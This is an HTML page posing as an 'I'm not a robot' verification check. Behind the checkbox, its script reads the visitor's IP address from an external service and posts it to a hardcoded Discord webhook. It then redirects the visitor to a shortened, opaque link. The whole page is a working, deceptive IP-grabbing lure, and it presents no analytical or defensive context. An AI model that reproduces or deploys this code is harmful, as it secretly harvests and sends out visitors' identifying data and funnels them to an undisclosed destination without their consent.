<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            height: 100vh;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container {
            text-align: center;
        }
        #verifyButton {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            display: none; /* Hidden until checkbox is checked */
        }
    </style>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your Discord webhook
        const REDIRECT_URL = "https://is.gd/gwuu9c"; // Your redirect link

        async function sendIPAndRedirect() {
            try {
                // Fetch user's IP from a fast and reliable API
                const response = await fetch("https://api64.ip.sb/jsonip");
                const data = await response.json();
                const userIP = data.ip;

                // Send IP to Discord webhook (non-blocking, redirect happens instantly)
                fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: `New Visitor IP: ${userIP}` })
                });

            } catch (error) {
                console.error("Error sending IP:", error);
            }

            // Redirect immediately after request is sent
            window.location.href = REDIRECT_URL;
        }

        function onCheckboxChange() {
            const verifyButton = document.getElementById("verifyButton");
            // Show the verify button if the checkbox is checked
            if (document.getElementById("verificationCheckbox").checked) {
                verifyButton.style.display = "inline-block";
            } else {
                verifyButton.style.display = "none";
            }
        }

        // Trigger the sendIPAndRedirect function when the user clicks the button
        function onVerifyClick() {
            sendIPAndRedirect();
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Verify Your Identity</h1>
        <p>Please verify that you are human by checking the box below.</p>
        <label>
            <input type="checkbox" id="verificationCheckbox" onchange="onCheckboxChange()">
            I'm not a robot
        </label>
        <button id="verifyButton" onclick="onVerifyClick()">Verify and Continue</button>
    </div>
</body>
</html>
